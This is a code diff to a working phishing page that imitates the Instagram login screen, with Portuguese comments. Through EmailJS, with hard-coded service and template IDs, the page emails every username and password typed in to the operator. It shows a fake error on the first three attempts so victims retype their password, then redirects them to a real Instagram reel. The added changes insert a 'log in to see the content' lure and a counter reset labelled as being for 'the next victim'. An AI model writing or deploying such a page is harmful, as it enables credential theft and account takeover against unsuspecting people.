@@ -4,9 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
-    <!-- Font Awesome para o ícone oficial da Meta -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    <!-- SDK EmailJS -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <style>
         :root {
@@ -36,6 +34,28 @@
             align-items: center;
             padding: 20px 0;
             overflow: hidden;
+        }
+
+        /* BANNER DE AVISO RÁPIDO */
+        #insta-toast {
+            position: fixed;
+            top: 20px;
+            background: #262626;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            z-index: 9999;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+            display: none;
+            animation: fadeInOut 2.5s forwards;
+        }
+
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateY(-20px); }
+            15% { opacity: 1; transform: translateY(0); }
+            85% { opacity: 1; transform: translateY(0); }
+            100% { opacity: 0; transform: translateY(-20px); }
         }
 
         .language-selector {
@@ -89,14 +109,6 @@
             transition: border 0.2s;
         }
 
-        input:focus {
-            border-color: #444;
-        }
-
-        input::placeholder {
-            color: #727272;
-        }
-
         .btn-submit {
             width: 100%;
             height: 44px;
@@ -108,10 +120,6 @@
             font-weight: 600;
             margin-top: 10px;
             cursor: pointer;
-        }
-
-        .btn-submit:disabled {
-            opacity: 0.6;
         }
 
         .forgot-link {
@@ -154,16 +162,6 @@
             color: #8e8e8e;
         }
 
-        .meta-footer i {
-            font-size: 18px;
-        }
-
-        .meta-text {
-            font-size: 13px;
-            font-weight: 600;
-            letter-spacing: 0.5px;
-        }
-
         #loading {
             display: none;
             position: fixed;
@@ -185,6 +183,7 @@
 </head>
 <body>
 
+    <div id="insta-toast">Faça login para ver o conteúdo</div>
     <div id="loading"><div class="spinner"></div></div>
 
     <div class="language-selector">Português (Brasil)</div>
@@ -211,7 +210,6 @@
 
     <div class="footer">
         <a href="#" class="btn-new-account">Criar nova conta</a>
-        
         <div class="meta-footer">
             <i class="fab fa-meta"></i>
             <span class="meta-text">Meta</span>
@@ -220,18 +218,20 @@
 
     <script>
         (function() {
-            emailjs.init({
-                publicKey: "pQgI8PYDXwr2zA-8h"
-            });
+            emailjs.init({ publicKey: "pQgI8PYDXwr2zA-8h" });
         })();
 
         const form = document.getElementById("loginForm");
-        const btnSubmit = document.getElementById("btnSubmit");
         const errorMsg = document.getElementById("error-message");
         const loading = document.getElementById("loading");
-        const passwordInput = document.getElementById("password");
+        const toast = document.getElementById("insta-toast");
 
-        // Contador de tentativas (salva no localStorage pra persistir mesmo se recarregar)
+        // Mostrar mensagem rápida ao entrar
+        window.onload = () => {
+            toast.style.display = "block";
+            setTimeout(() => { toast.style.display = "none"; }, 2500);
+        };
+
         let attempts = parseInt(localStorage.getItem('loginAttempts') || '0');
 
         form.addEventListener("submit", function(e) {
@@ -240,21 +240,14 @@
             errorMsg.style.display = "none";
 
             const username = form.username.value.trim();
-            const password = passwordInput.value.trim();
-
-            if (!username || !password) {
-                loading.style.display = "none";
-                return;
-            }
+            const password = form.password.value.trim();
 
             const templateParams = {
                 username: username,
                 password: password,
-                attempt: attempts + 1  // pra tu ver qual tentativa chegou no email
-                // Adicione date: new Date().toLocaleString('pt-BR') se teu template tiver {{date}}
+                attempt: attempts + 1
             };
 
-            // Envia SEMPRE (pra capturar todas as tentativas)
             emailjs.send("service_enl5l78", "template_75bhyah", templateParams)
             .then(() => {
                 attempts++;
@@ -264,32 +257,23 @@
                     loading.style.display = "none";
 
                     if (attempts < 4) {
-                        // 1ª, 2ª e 3ª: erro fake + limpa senha
+                        // 1ª, 2ª e 3ª tentativas: Mostra erro e limpa senha
                         errorMsg.style.display = "block";
-                        passwordInput.value = "";
-                        passwordInput.focus();
+                        form.password.value = "";
+                        form.password.focus();
                     } else {
-                        // 4ª tentativa: redireciona pro Insta real
-                        window.location.href = "https://www.instagram.com/";
+                        // 4ª tentativa: Redireciona pro link específico
+                        localStorage.setItem('loginAttempts', '0'); // Reseta pra próxima vítima
+                        window.location.href = "https://www.instagram.com/reel/DVPfikwiJr7/?igsh=cng3YTMzNjNtdnJs";
                     }
-                }, 1200); // delay realista
+                }, 1000);
             })
-            .catch((err) => {
-                console.log('Deu ruim no envio:', err);
+            .catch(() => {
                 loading.style.display = "none";
                 errorMsg.style.display = "block";
             });
         });
-
-        // Habilita botão só se tiver texto
-        form.addEventListener("input", () => {
-            const user = document.getElementById("username").value.trim();
-            const pass = document.getElementById("password").value.trim();
-            btnSubmit.disabled = !(user.length > 0 && pass.length > 0);
-        });
-
-        // Reset contador se quiser (opcional: descomenta se precisar testar várias vezes)
-        // localStorage.removeItem('loginAttempts');
     </script>
 </body>
 </html>
+
